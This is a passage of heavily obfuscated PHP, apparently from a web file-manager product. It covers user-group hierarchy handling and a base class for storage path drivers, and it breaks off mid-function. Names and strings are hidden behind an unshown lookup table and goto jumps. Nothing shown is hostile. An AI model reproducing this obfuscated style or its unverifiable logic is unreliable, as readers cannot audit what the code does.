$÷åí²­Á = $¢»ç³[$½Çò¨“Š[1449]]; $¢»ç³[$½Çò¨“Š[2241]] = isset($¿ÚÆ®­è[$÷åí²­Á]) ? intval($¿ÚÆ®­è[$÷åí²­Á]) : !1; } unset($¢»ç³); } private function _listAppendMeta(&$ª“³õ™é, $„êššúß) { $à¹“È†ò =& $_SERVER[Ï×Œõ”û]; $Ò‹Óû®ï = array($à¹“È†ò[1449] => array($à¹“È†ò[7], $„êššúß)); $¹‡ã÷ó® = Model($à¹“È†ò[2228])->where($Ò‹Óû®ï)->select(); $¹‡ã÷ó® = array_to_keyvalue_group($¹‡ã÷ó®, $à¹“È†ò[1449]); foreach ($¹‡ã÷ó® as &$¿Œ¨°É) { $¿Œ¨°É = array_to_keyvalue($¿Œ¨°É, $à¹“È†ò[95], $à¹“È†ò[452]); } unset($¿Œ¨°É); foreach ($ª“³õ™é as &$ƒÊŒ­Á’) { $ƒÊŒ­Á’[$à¹“È†ò[560]] = array(); if (isset($¹‡ã÷ó®[$ƒÊŒ­Á’[$à¹“È†ò[1449]]])) { $ƒÊŒ­Á’[$à¹“È†ò[560]] = $¹‡ã÷ó®[$ƒÊŒ­Á’[$à¹“È†ò[1449]]]; } } unset($ƒÊŒ­Á’); } protected function parentLevelArray($íÀÁôÑ·) { $õÏŸÕ×¢ =& $_SERVER[Ï×Œõ”û]; $íÀÁôÑ· = explode($õÏŸÕ×¢[50], trim($íÀÁôÑ·, $õÏŸÕ×¢[50])); $íÀÁôÑ· = array_remove_value($íÀÁôÑ·, $õÏŸÕ×¢[230]); return $íÀÁôÑ·; } protected function parentInGroup($Ó¸ÎûÉ“, $Â»Ø¡«Ò) { $‡Ø¦Ô¯ö =& $_SERVER[Ï×Œõ”û]; $õ÷àÎøà = $this->getInfoSimple($Ó¸ÎûÉ“); if (!$õ÷àÎøà) { return !0; } $Í©Åí”Â = $this->parentLevelArray($õ÷àÎøà[$‡Ø¦Ô¯ö[609]]); $Í©Åí”Â[] = $Ó¸ÎûÉ“; foreach ($Í©Åí”Â as $Ó¸ÎûÉ“) { if (in_array($Ó¸ÎûÉ“ . $‡Ø¦Ô¯ö[12], $Â»Ø¡«Ò)) { return !0; } } return !1; } private function _listAppendParent(&$³Ï½ó×ê) { $ø”ê¦– =& $_SERVER[Ï×Œõ”û]; $Ø˜àãÉ = array(); foreach ($³Ï½ó×ê as &$ƒûîôŠ§) { $Ø˜àãÉ[$ƒûîôŠ§[$ø”ê¦–[1449]]] = $ƒûîôŠ§[$ø”ê¦–[32]]; $‚†µªèŒ = $this->parentLevelArray($ƒûîôŠ§[$ø”ê¦–[609]]); foreach ($‚†µªèŒ as $ÅÙ î‡µ) { if (!isset($Ø˜àãÉ[$ÅÙ î‡µ])) { $Ø˜àãÉ[$ÅÙ î‡µ] = 0; } } } unset($ƒûîôŠ§); foreach ($Ø˜àãÉ as $½¾¤“¾ü => $§èªÈê¾) { if ($§èªÈê¾) { continue; } $şûŠ®ß = $this->getInfoSimple($½¾¤“¾ü); $Ø˜àãÉ[$½¾¤“¾ü] = $şûŠ®ß[$ø”ê¦–[32]]; } $ØÈ¬‡Ü¸ = $GLOBALS[$ø”ê¦–[6]][$ø”ê¦–[92]][$ø”ê¦–[2242]]; if (KodUser::isRoot()) { $ØÈ¬‡Ü¸ = !1; } foreach ($³Ï½ó×ê as &$ƒûîôŠ§) { $‚†µªèŒ = $this->parentLevelArray($ƒûîôŠ§[$ø”ê¦–[609]]); $±¿ÙöÇá = $ø”ê¦–[12]; foreach ($‚†µªèŒ as $½¾¤“¾ü => $ÅÙ î‡µ) { if ($ØÈ¬‡Ü¸ && $½¾¤“¾ü == 0) { continue; } $±¿ÙöÇá .= $Ø˜àãÉ[$ÅÙ î‡µ] . $ø”ê¦–[8]; } if ($‚†µªèŒ) { $±¿ÙöÇá .= $ƒûîôŠ§[$ø”ê¦–[32]]; } $ƒûîôŠ§[$ø”ê¦–[614]] = str_replace($ø”ê¦–[256], $ø”ê¦–[8], $±¿ÙöÇá); } unset($ƒûîôŠ§); } private function _listAppendSourceRoot(&$Õ¾ãéé, $¯Œã»íÛ) { $‹ˆÓÚòÓ =& $_SERVER[Ï×Œõ”û]; $ÏìÑÉÜ­ = Model($‹ˆÓÚòÓ[939])->listSourceRoot(SourceModel::TYPE_GROUP, $¯Œã»íÛ); $ÏìÑÉÜ­ = array_to_keyvalue($ÏìÑÉÜ­, $‹ˆÓÚòÓ[594]); $ÏìÑÉÜ­ = array_remove_key($ÏìÑÉÜ­, $‹ˆÓÚòÓ[594]); foreach ($Õ¾ãéé as &$…˜—´‰†) { $…˜—´‰†[$‹ˆÓÚòÓ[90]] = $ÏìÑÉÜ­[$…˜—´‰†[$‹ˆÓÚòÓ[1449]]] ? $ÏìÑÉÜ­[$…˜—´‰†[$‹ˆÓÚòÓ[1449]]] : array(); } unset($…˜—´‰†); } protected function groupMerge($ºÈÌ¢Öõ) { $ºÈÌ¢Öõ = array_values(array_unique($ºÈÌ¢Öõ)); $®ãÀ…“ç = array(); for ($ÍÑä±œ = 0; $ÍÑä±œ < count($ºÈÌ¢Öõ); $ÍÑä±œ++) { $í€ííƒà = !1; for ($î–çÈ = 0; $î–çÈ < count($ºÈÌ¢Öõ); $î–çÈ++) { if ($ÍÑä±œ == $î–çÈ) { continue; } if ($this->isParentOf($ºÈÌ¢Öõ[$î–çÈ], $ºÈÌ¢Öõ[$ÍÑä±œ])) { $í€ííƒà = !0; break; } } if (!$í€ííƒà) { $®ãÀ…“ç[] = $ºÈÌ¢Öõ[$ÍÑä±œ]; } } return $®ãÀ…“ç; } protected function isParentOf($÷†¢÷ŠÀ, $í£Ø˜ŸØ) { $â­äš¨Ú =& $_SERVER[Ï×Œõ”û]; if (!$÷†¢÷ŠÀ || !$í£Ø˜ŸØ || $÷†¢÷ŠÀ == $í£Ø˜ŸØ) { return !1; } $£šğ®Ç½ = $this->getInfoSimple($÷†¢÷ŠÀ); $„‡ÓĞÊ‹ = $this->getInfoSimple($í£Ø˜ŸØ); $Ÿİø‘Ó¡ = $£šğ®Ç½[$â­äš¨Ú[609]] . $÷†¢÷ŠÀ . $â­äš¨Ú[50]; if (substr($„‡ÓĞÊ‹[$â­äš¨Ú[609]], 0, strlen($Ÿİø‘Ó¡)) == $Ÿİø‘Ó¡) { return !0; } return !1; } public function groupShowRoot($’§®Ò¹, $ÃÓ’ìŸ¹ = false) { $¬ÎïÚ¿… =& $_SERVER[Ï×Œõ”û]; $’¼ô¾Ğ = $this->getInfo($’§®Ò¹); if (!$’¼ô¾Ğ) { return array(); } $Å©“µ¢ = $this->parentLevelArray($’¼ô¾Ğ[$¬ÎïÚ¿…[609]]); $Ñ±Î§ÔÇ = array($’§®Ò¹); if (count($Å©“µ¢) == 0) { return $Ñ±Î§ÔÇ; } if ($ÃÓ’ìŸ¹ && count($Å©“µ¢) == 1) { return $Ñ±Î§ÔÇ; } if (!$’¼ô¾Ğ[$¬ÎïÚ¿…[560]] || !isset($’¼ô¾Ğ[$¬ÎïÚ¿…[560]][$¬ÎïÚ¿…[2223]]) || $’¼ô¾Ğ[$¬ÎïÚ¿…[560]][$¬ÎïÚ¿…[2223]] == $¬ÎïÚ¿…[885]) { return $this->groupShowRoot($Å©“µ¢[count($Å©“µ¢) - 1], $ÃÓ’ìŸ¹); } if ($’¼ô¾Ğ[$¬ÎïÚ¿…[560]][$¬ÎïÚ¿…[2223]] == $¬ÎïÚ¿…[434]) { $³¸ùï¹¾ = explode($¬ÎïÚ¿…[50], $’¼ô¾Ğ[$¬ÎïÚ¿…[560]][$¬ÎïÚ¿…[2224]]); if ($³¸ùï¹¾) { $Ñ±Î§ÔÇ = array_merge($Ñ±Î§ÔÇ, $³¸ùï¹¾); } } return $Ñ±Î§ÔÇ; } protected function resetParentLevel() { $§ù“İº¼ =& $_SERVER[Ï×Œõ”û]; $ËïãÎµ = $§ù“İº¼[1449]; $ßª£Ò¨ç = $this->select(); $ßª£Ò¨ç = array_to_keyvalue($ßª£Ò¨ç, $ËïãÎµ); foreach ($ßª£Ò¨ç as $›¬›Ô¬) { $…©‚éÛ÷ = $›¬›Ô¬; $ª™ê¾´÷ = array(); while ($…©‚éÛ÷[$§ù“İº¼[192]] != 0) { $ª™ê¾´÷[] = $…©‚éÛ÷[$§ù“İº¼[192]]; $…©‚éÛ÷ = $ßª£Ò¨ç[$…©‚éÛ÷[$§ù“İº¼[192]]]; } $ª™ê¾´÷[] = 0; $ª™ê¾´÷ = $§ù“İº¼[50] . implode($§ù“İº¼[50], array_reverse($ª™ê¾´÷)) . $§ù“İº¼[50]; $this->setNamePinyin($›¬›Ô¬[$ËïãÎµ], $›¬›Ô¬[$§ù“İº¼[32]]); $this->where(array($ËïãÎµ => $›¬›Ô¬[$ËïãÎµ]))->save(array($§ù“İº¼[680] => $ª™ê¾´÷)); } return $ßª£Ò¨ç; } public function groupNameAuto($¬ÚõµÅì, $İ¢Ğ·¯æ) { $¬çÎ°Í =& $_SERVER[Ï×Œõ”û]; $±¿å Ñ¾ = $this->where(array($¬çÎ°Í[497] => $¬ÚõµÅì))->getField($¬çÎ°Í[32], !0); if (!$±¿å Ñ¾ || !in_array($İ¢Ğ·¯æ, $±¿å Ñ¾)) { return $İ¢Ğ·¯æ; } for ($à·‚úËÆ = 1; $à·‚úËÆ <= count($±¿å Ñ¾) + 1; $à·‚úËÆ++) { $ÄõÇÙçË = $İ¢Ğ·¯æ . "\50{$à·‚úËÆ}\x29"; if (!in_array($ÄõÇÙçË, $±¿å Ñ¾)) { return $ÄõÇÙçË; } } } public function groupSwitch($Õ›Ô± Â, $ñ¬Ó¬÷—) { $Í¿‰ºí“ =& $_SERVER[Ï×Œõ”û]; $»‹Í¾’ë = array($Í¿‰ºí“[1449] => array($Í¿‰ºí“[7], array($Õ›Ô± Â, $ñ¬Ó¬÷—))); $æœ¶«¯ä = $this->where($»‹Í¾’ë)->select(); $æœ¶«¯ä = array_to_keyvalue($æœ¶«¯ä, $Í¿‰ºí“[1449]); $¢¨¢œç = _get($æœ¶«¯ä, $Õ›Ô± Â); $Ë¢à® = _get($æœ¶«¯ä, $ñ¬Ó¬÷—); if (!$¢¨¢œç || !$Ë¢à® || $¢¨¢œç[$Í¿‰ºí“[192]] == 0) { return !1; } if ($¢¨¢œç[$Í¿‰ºí“[1449]] == $Ë¢à®[$Í¿‰ºí“[1449]]) { return !1; } if (strpos($Ë¢à®[$Í¿‰ºí“[609]], $¢¨¢œç[$Í¿‰ºí“[609]] . $¢¨¢œç[$Í¿‰ºí“[1449]] . $Í¿‰ºí“[50]) === 0) { return !1; } $»‹Í¾’ë = array($Í¿‰ºí“[1449] => $Õ›Ô± Â); $°ÏÂ§Èï = Model($Í¿‰ºí“[2229])->where($»‹Í¾’ë)->select(); if (!$°ÏÂ§Èï) { $°ÏÂ§Èï = array(); } foreach ($°ÏÂ§Èï as $­¹ë¨Ø) { $ÓŸèßÒ± = $­¹ë¨Ø[$Í¿‰ºí“[1547]]; $»‹Í¾’ë = array($Í¿‰ºí“[1547] => $ÓŸèßÒ±, $Í¿‰ºí“[1449] => $ñ¬Ó¬÷—); $ñ‰Ó™” = Model($Í¿‰ºí“[2229])->where($»‹Í¾’ë)->find(); if (!$ñ‰Ó™”) { $»àŒ›Í‰ = array($ñ¬Ó¬÷— => $­¹ë¨Ø[$Í¿‰ºí“[1594]]); Model($Í¿‰ºí“[622])->userGroupAdd($ÓŸèßÒ±, $»àŒ›Í‰); } Model($Í¿‰ºí“[622])->userGroupRemove($ÓŸèßÒ±, $Õ›Ô± Â); } $»‹Í¾’ë = array($Í¿‰ºí“[190] => 2, $Í¿‰ºí“[192] => 0, $Í¿‰ºí“[505] => 1, $Í¿‰ºí“[594] => array($Í¿‰ºí“[7], array($Õ›Ô± Â, $ñ¬Ó¬÷—))); $À‚»¬Õ = Model($Í¿‰ºí“[939])->where($»‹Í¾’ë)->field($Í¿‰ºí“[2243])->select(); $À‚»¬Õ = array_to_keyvalue($À‚»¬Õ, $Í¿‰ºí“[594], $Í¿‰ºí“[193]); $¯Û˜¨™Ç = !empty($À‚»¬Õ[$Õ›Ô± Â]) ? $À‚»¬Õ[$Õ›Ô± Â] : !1; if ($¯Û˜¨™Ç) { if (!$À‚»¬Õ[$ñ¬Ó¬÷—]) { $À‚»¬Õ[$ñ¬Ó¬÷—] = Model($Í¿‰ºí“[939])->groupRootAdd($ñ¬Ó¬÷—); } $°Ø†Ù´ı = $À‚»¬Õ[$ñ¬Ó¬÷—]; $»‹Í¾’ë = array($Í¿‰ºí“[192] => $¯Û˜¨™Ç); $À‚»¬Õ = Model($Í¿‰ºí“[939])->where($»‹Í¾’ë)->field($Í¿‰ºí“[2244])->select(); if (!$À‚»¬Õ) { $À‚»¬Õ = array(); } Model($Í¿‰ºí“[939])->moveClearAuth = !1; foreach ($À‚»¬Õ as $‚éëÅøı) { $¨×¬Ú£ò = $‚éëÅøı[$Í¿‰ºí“[505]] == $Í¿‰ºí“[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Í¿‰ºí“[939])->move($‚éëÅøı[$Í¿‰ºí“[193]], $°Ø†Ù´ı, $¨×¬Ú£ò); } Model($Í¿‰ºí“[939])->moveClearAuth = !0; $»‹Í¾’ë = array($Í¿‰ºí“[190] => 2, $Í¿‰ºí“[594] => $Õ›Ô± Â); $¦¦ğ»Í¢ = array($Í¿‰ºí“[594] => $ñ¬Ó¬÷—); Model($Í¿‰ºí“[2245])->where($»‹Í¾’ë)->save($¦¦ğ»Í¢); Model($Í¿‰ºí“[2246])->where($»‹Í¾’ë)->save($¦¦ğ»Í¢); } $this->_changeChildLevel($æœ¶«¯ä[$Õ›Ô± Â], $æœ¶«¯ä[$ñ¬Ó¬÷—], !0); $this->where(array($Í¿‰ºí“[192] => $Õ›Ô± Â))->save(array($Í¿‰ºí“[192] => $ñ¬Ó¬÷—)); $this->_clearChildrenCache($æœ¶«¯ä[$ñ¬Ó¬÷—]); return !0; } } goto B¬£Î½‡ì; a±òÓ¨¶Ô”: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ı‡ÀàË› =& $_SERVER[Ï×Œõ”û]; $this->objectDriver = array($ı‡ÀàË›[60], $ı‡ÀàË›[61], $ı‡ÀàË›[62], $ı‡ÀàË›[63], $ı‡ÀàË›[64], $ı‡ÀàË›[65], $ı‡ÀàË›[66], $ı‡ÀàË›[67], $ı‡ÀàË›[68], $ı‡ÀàË›[69], $ı‡ÀàË›[70], $ı‡ÀàË›[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¨ƒ³ú ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¨ƒ³ú , $_SERVER[Ï×Œõ”û][8]); } return $¨ƒ³ú ; } public function iconvApp($¨­“¿É•) { return $¨­“¿É•; } public function iconvSystem($Á“£à…) { return $Á“£à…; } public function iconvTo($¸Ã‹ã©ò, $¢äÍØÓ, $¢«€¦Ğİ) { $›Ö„›£Ñ =& $_SERVER[Ï×Œõ”û]; if (!$¸Ã‹ã©ò || !function_exists($›Ö„›£Ñ[72])) { return $¸Ã‹ã©ò; } static $­°·éğ = array(); $òì¤ªÉå = $¢äÍØÓ . $›Ö„›£Ñ[73] . $¢«€¦Ğİ . $›Ö„›£Ñ[74] . $¸Ã‹ã©ò; if (isset($­°·éğ[$òì¤ªÉå])) { return $­°·éğ[$òì¤ªÉå]; } if (function_exists($›Ö„›£Ñ[75])) { $ÊùƒÓÄï = @mb_convert_encoding($¸Ã‹ã©ò, $¢«€¦Ğİ, $¢äÍØÓ); } else { $ÊùƒÓÄï = @iconv($¢äÍØÓ, $¢«€¦Ğİ, $¸Ã‹ã©ò); } $ÊùƒÓÄï = $ÊùƒÓÄï ? $ÊùƒÓÄï : $¸Ã‹ã©ò; if (strstr($ÊùƒÓÄï, $›Ö„›£Ñ[76])) { $ÊùƒÓÄï = str_replace($›Ö„›£Ñ[76], $›Ö„›£Ñ[11], $ÊùƒÓÄï); } $­°·éğ[$¢äÍØÓ . $›Ö„›£Ñ[73] . $¢«€¦Ğİ . $›Ö„›£Ñ[74] . $¸Ã‹ã©ò] = $ÊùƒÓÄï; $­°·éğ[$¢«€¦Ğİ . $›Ö„›£Ñ[73] . $¢äÍØÓ . $›Ö„›£Ñ[74] . $¸Ã‹ã©ò] = $¸Ã‹ã©ò; $­°·éğ[$¢«€¦Ğİ . $›Ö„›£Ñ[73] . $¢äÍØÓ . $›Ö„›£Ñ[74] . $ÊùƒÓÄï] = $¸Ã‹ã©ò; $­°·éğ[$¢äÍØÓ . $›Ö„›£Ñ[73] . $¢«€¦Ğİ . $›Ö„›£Ñ[74] . $ÊùƒÓÄï] = $ÊùƒÓÄï; return $ÊùƒÓÄï; } public function getPathInner($à¥‚—æ) { $³•„ÄÒ¬ = IO::init($à¥‚—æ); return $³•„ÄÒ¬->path; } public function getPathOuter($ÏâŞ×­¿) { $„¨íÅ”¬ =& $_SERVER[Ï×Œõ”û]; $Ş¬¬³¿— = strlen(trim($this->pathBase, $„¨íÅ”¬[8])); $ÏâŞ×­¿ = substr(trim($ÏâŞ×­¿, $„¨íÅ”¬[8]), $Ş¬¬³¿—); return $this->pathDriver . $„¨íÅ”¬[8] . ltrim($ÏâŞ×­¿, $„¨íÅ”¬[8]); } public function isParentOf($Ï»ü²˜”, $¾ı›šı) { $µÓÛÆ¸Ÿ =& $_SERVER[Ï×Œõ”û]; $Ï»ü²˜” = rtrim(strtolower($Ï»ü²˜”), $µÓÛÆ¸Ÿ[8]) . $µÓÛÆ¸Ÿ[8]; $¾ı›šı = rtrim(strtolower($¾ı›šı), $µÓÛÆ¸Ÿ[8]) . $µÓÛÆ¸Ÿ[8]; $ëûşÃ¢¼ = strpos($¾ı›šı, $Ï»ü²˜”) === 0; return $ëûşÃ¢¼; } public function getType() { $ïë™øÒÌ =& $_SERVER[Ï×Œõ”û]; $µö„şû© = str_replace($ïë™øÒÌ[77], $ïë™øÒÌ[12], get_class($this)); return strtolower($µö„şû©); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($äŞ¤ƒ”Í, $Ÿ¬ÏÇ¤Ÿ) { $å¶Ù‚’À =& $_SERVER[Ï×Œõ”û]; $ÓÁâØ•¦ = rtrim($äŞ¤ƒ”Í, $å¶Ù‚’À[8]) . $å¶Ù‚’À[8] . $Ÿ¬ÏÇ¤Ÿ; $îö¼ÄÌ´ = $this->exist($ÓÁâØ•¦); return $îö¼ÄÌ´ ? $ÓÁâØ•¦ : !1; } public function setModifyTime($ÔŒ¿Ç£÷, $¨ÃÛ”„ = '') { } public function renameObject($™ÃÈÅã, $ñ×«ÉÎ÷) { $ºë‰¦ˆ£ = $ñ×«ÉÎ÷; $™ÃÈÅã = $this->getPathOuter($™ÃÈÅã); $ñ×«ÉÎ÷ = $this->pathFather($™ÃÈÅã) . $ñ×«ÉÎ÷; $±î¸ Ÿ” = IO::copy($™ÃÈÅã, $this->pathFather($™ÃÈÅã), REPEAT_RENAME_FOLDER, $ºë‰¦ˆ£); if ($±î¸ Ÿ”) { IO::remove($™ÃÈÅã); } return $±î¸ Ÿ” ? $ñ×«ÉÎ÷ : !1; } public function tempFile($³£ÂûÙ = '', $ïÓ³àÁ = '') { if (!$³£ÂûÙ) { $³£ÂûÙ = rand_string(15); } $¥öã‰Ó = TEMP_FILES . rand_string(15) . $_SERVER[Ï×Œõ”û][8]; @mkdir($¥öã‰Ó, DEFAULT_PERRMISSIONS, !0); $ñÜÙåî« = $¥öã‰Ó . $³£ÂûÙ; @touch($ñÜÙåî«); if ($ïÓ³àÁ) { file_put_contents($ñÜÙåî«, $ïÓ³àÁ); } return $ñÜÙåî«; } public function tempFileRemve($€“İù) { @unlink($€“İù); @rmdir($this->pathFather($€“İù)); } public function mkfile($£óùŠ, $í”Ö¶Ì³ = '', $İŒ¤ºĞ° = REPEAT_RENAME) { } public function mkdir($‚şã”²Ğ, $í¡—¤”™ = REPEAT_SKIP) { } public function delFile($¤Œ’ÏÍƒ) { } public function delFolder($š¨©‚²) { } public function copyFile($¡î‚Û°¯, $ËÕ®·µ˜) { } public function moveFile($ø£ûİ–ò, $š‚ªÃÈ¯) { } public function remove($›à–’Ÿœ) { if ($this->isFile($›à–’Ÿœ)) { return $this->delFile($›à–’Ÿœ); } return $this->delFolder($›à–’Ÿœ); } public function rename($ë“ñ‚ã™, $ŒÁ¢æÍˆ) { } public function exist($ş—âåÒ») { } public function isFile($Œæäƒ) { } public function isFolder($Ê­ºû) { } public function size($ÇšÍ’ø‰) { } public function info($ Ú¤úÖ”) { } public function infoSimple($°Ö‘À„³) { return $this->info($°Ö‘À„³); } public function infoAuth($Åõ¦´ô–) { return $this->info($Åõ¦´ô–); } public function infoFull($¢¸ÆÃŠÊ) { return $this->info($¢¸ÆÃŠÊ); } public function infoFullSimple($‹ŠôšÒ‹) { return $this->info($‹ŠôšÒ‹); } public function infoWithChildren($“ÃÖŒƒ¦) { $¥Ò™ÇÄ¸ =& $_SERVER[Ï×Œõ”û]; static $ß±ËÈ§¬ = array(); if (isset($ß±ËÈ§¬[$“ÃÖŒƒ¦])) { return $ß±ËÈ§¬[$“ÃÖŒƒ¦]; } $†¶æö = $this->info($“ÃÖŒƒ¦); if ($†¶æö && $†¶æö[$¥Ò™ÇÄ¸[33]] == $¥Ò™ÇÄ¸[78]) { $­ş©‘•” = array($¥Ò™ÇÄ¸[79] => 0, $¥Ò™ÇÄ¸[80] => 0, $¥Ò™ÇÄ¸[81] => 0); $this->infoChildren($“ÃÖŒƒ¦, $­ş©‘•”); $†¶æö[$¥Ò™ÇÄ¸[79]] = $­ş©‘•”[$¥Ò™ÇÄ¸[79]]; $†¶æö[$¥Ò™ÇÄ¸[82]] = array($¥Ò™ÇÄ¸[83] => $­ş©‘•”[$¥Ò™ÇÄ¸[80]], $¥Ò™ÇÄ¸[84] => $­ş©‘•”[$¥Ò™ÇÄ¸[81]]); $ß±ËÈ§¬[$“ÃÖŒƒ¦] = $†¶æö; } return $†¶æö; } public function listPath($ğ®ì£“³, $‡İê¯™ = false) { } public function has($¤‰¸æ¡, $¿Ğ’¤®â = false, $ÒÀÏÑïÈ = false) { } public function canRead($”ƒ„øğ) { } public function canWrite($ôøß‰­Ş) { } public function getContent($¦©’¯²û) { } public function setContent($¦—ÙÔ‰Ø, $—°ùœĞ = '') { } protected function infoChildren($¥¦†û”×, &$¶ò¯™Íë) { $¸ú®ÄŠº =& $_SERVER[Ï×Œõ”û]; check_abort_echo(); $Œ«î€ğö = $this->listPath($¥¦†û”×, !0); $Œ«î€ğö = array_merge($Œ«î€ğö[$¸ú®ÄŠº[85]], $Œ«î€ğö[$¸ú®ÄŠº[86]]); foreach ($Œ«î€ğö as $™ë‰É²) { if ($™ë‰É²[$¸ú®ÄŠº[33]] == $¸ú®ÄŠº[78]) { $¶ò¯™Íë[$¸ú®ÄŠº[81]]++; $ÕÖ¥øÇ = $this->getPathInner($™ë‰É²[$¸ú®ÄŠº[87]]); $this->infoChildren($ÕÖ¥øÇ, $¶ò¯™Íë); } else { $¶ò¯™Íë[$¸ú®ÄŠº[80]]++; $¶ò¯™Íë[$¸ú®ÄŠº[79]] += $™ë‰É²[$¸ú®ÄŠº[79]]; } } } public function fileSubstr($ßü½è×Â, $³ªÀÁùı, $º³¡¤‹±) { } public function listAll($Ó†ü¿Âô) { } public function listAllMake($‡˜ º·, &$Ò€Å¿Ñ) { $ÏÑÂÔºˆ =& $_SERVER[Ï×Œõ”û]; check_abort_echo(); $Ü‡–¾ß = $this->listPath($‡˜ º·, !0); if (!$Ü‡–¾ß) { return; } $ö‰÷Ù = array_merge($Ü‡–¾ß[$ÏÑÂÔºˆ[85]], $Ü‡–¾ß[$ÏÑÂÔºˆ[86]]); foreach ($ö‰÷Ù as $ÍÂøâûÄ) { $¡áìñ—á = $ÍÂøâûÄ[$ÏÑÂÔºˆ[33]] == $ÏÑÂÔºˆ[78]; $åìÁ¬¼Ô = array($ÏÑÂÔºˆ[87] => $ÍÂøâûÄ[$ÏÑÂÔºˆ[87]], $ÏÑÂÔºˆ[78] => $¡áìñ—á); if (isset($ÍÂøâûÄ[$ÏÑÂÔºˆ[79]])) { $åìÁ¬¼Ô[$ÏÑÂÔºˆ[79]] = $ÍÂøâûÄ[$ÏÑÂÔºˆ[79]]; } if (isset($ÍÂøâûÄ[$ÏÑÂÔºˆ[88]])) { $åìÁ¬¼Ô[$ÏÑÂÔºˆ[88]] = $ÍÂøâûÄ[$ÏÑÂÔºˆ[88]]; } if (!$¡áìñ—á) { $Ò€Å¿Ñ[] = $åìÁ¬¼Ô; continue; } $Ò€Å¿Ñ[] = $åìÁ¬¼Ô; $ÆË„˜²Å = $ÍÂøâûÄ[$ÏÑÂÔºˆ[87]]; $ÔóíÒá‚ = $this->pathDriver; if (substr($ÍÂøâûÄ[$ÏÑÂÔºˆ[87]], 0, strlen($ÔóíÒá‚)) == $ÔóíÒá‚) { $ÆË„˜²Å = substr($ÆË„˜²Å, strlen($ÔóíÒá‚)); } $this->listAllMake($ÆË„˜²Å, $Ò€Å¿Ñ); } } public function listAllSimple($ê²ª‰…Í, $èŞ”ÉÖÅ = false) { $…É‰¯Ê = $this->listAll($ê²ª‰…Í); return $this->listAllSimpleMake($…É‰¯Ê, $this->getPathOuter($ê²ª‰…Í), $èŞ”ÉÖÅ); } public function listAllSimpleMake($ÚÃÚğÕÀ, $Ê¾Óì´ú, $„Ñ›™šÌ) { $±®îŒ˜Ë =& $_SERVER[Ï×Œõ”û]; $¢“ÜÑûÂ = array(); $Ê¾Óì´ú = rtrim(get_path_father($Ê¾Óì´ú), $±®îŒ˜Ë[8]) . $±®îŒ˜Ë[8]; foreach ($ÚÃÚğÕÀ as $±û¹†àÆ) { $úáÏÙü‹ = array($±®îŒ˜Ë[87] => $±û¹†àÆ[$±®îŒ˜Ë[87]], $±®îŒ˜Ë[89] => $±û¹†àÆ[$±®îŒ˜Ë[87]], $±®îŒ˜Ë[78] => $±û¹†àÆ[$±®îŒ˜Ë[78]]); if (isset($±û¹†àÆ[$±®îŒ˜Ë[79]]) && !$±û¹†àÆ[$±®îŒ˜Ë[78]]) { $úáÏÙü‹[$±®îŒ˜Ë[79]] = $±û¹†àÆ[$±®îŒ˜Ë[79]]; } if (isset($±û¹†àÆ[$±®îŒ˜Ë[88]])) { $úáÏÙü‹[$±®îŒ˜Ë[88]] = $±û¹†àÆ[$±®îŒ˜Ë[88]]; } if (is_array($±û¹†àÆ[$±®îŒ˜Ë[90]])) { $úáÏÙü‹[$±®îŒ˜Ë[89]] = $±û¹†àÆ[$±®îŒ˜Ë[90]][$±®îŒ˜Ë[87]]; $úáÏÙü‹[$±®îŒ˜Ë[79]] = $±û¹†àÆ[$±®îŒ˜Ë[90]][$±®îŒ˜Ë[79]]; $úáÏÙü‹[$±®îŒ˜Ë[88]] = $±û¹†àÆ[$±®îŒ˜Ë[90]][$±®îŒ˜Ë[88]]; } else { if (substr($±û¹†àÆ[$±®îŒ˜Ë[87]], 0, strlen($Ê¾Óì´ú)) == $Ê¾Óì´ú) { $úáÏÙü‹[$±®îŒ˜Ë[87]] = substr($±û¹†àÆ[$±®îŒ˜Ë[87]], strlen($Ê¾Óì´ú)); } } $ğ°ØæşÏ = $±û¹†àÆ[$±®îŒ˜Ë[78]] ? $±®îŒ˜Ë[8] : $±®îŒ˜Ë[12]; $úáÏÙü‹[$±®îŒ˜Ë[89]] = rtrim($úáÏÙü‹[$±®îŒ˜Ë[89]], $±®îŒ˜Ë[8]) . $ğ°ØæşÏ; $úáÏÙü‹[$±®îŒ˜Ë[87]] = $±®îŒ˜Ë[8] . trim($úáÏÙü‹[$±®îŒ˜Ë[87]], $±®îŒ˜Ë[8]) . $ğ°ØæşÏ; if (!$„Ñ›™šÌ) { $™§Óºõ‹ = explode($±®îŒ˜Ë[8], trim($úáÏÙü‹[$±®îŒ˜Ë[87]], $±®îŒ˜Ë[8])); $úáÏÙü‹[$±®îŒ˜Ë[87]] = $±®îŒ˜Ë[8] . implode($±®îŒ˜Ë[8], array_slice($™§Óºõ‹, 1)) . $ğ°ØæşÏ; } $¢“ÜÑûÂ[] = $úáÏÙü‹; } return array_sort_by($¢“ÜÑûÂ, $±®îŒ˜Ë[87]); } public function upload($­¾Ø®ğ, $åÚÍ¡Í‡, $™¨³¶Ì = false, $Ëİ†›¡§ = REPEAT_REPLACE) { } public function uploadFileByID($½ÈÏùÌ‹, $Ñü¹¥š…, $«Èµë‚) { } public function uploadFileByPath($Ê”ÂÓªû, $Œ®¤Ğº®, $æø±¼ = array()) { } public function isUploadServer() { $Ñ‹ã§İ˜ =& $_SERVER[Ï×Œõ”û]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ñ‹ã§İ˜[91]) { return !0; } return $GLOBALS[$Ñ‹ã§İ˜[6]][$Ñ‹ã§İ˜[92]][$Ñ‹ã§İ˜[93]]; } public function isFileOutServer() { $Ğ¨Âşë‡ =& $_SERVER[Ï×Œõ”û]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ğ¨Âşë‡[91]) { return !0; } return $GLOBALS[$Ğ¨Âşë‡[6]][$Ğ¨Âşë‡[92]][$Ğ¨Âşë‡[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($÷ÃÌÍüı) { $İ…µÔÜ =& $_SERVER[Ï×Œõ”û]; if (!$this->isCdnHost()) { return $÷ÃÌÍüı; } return 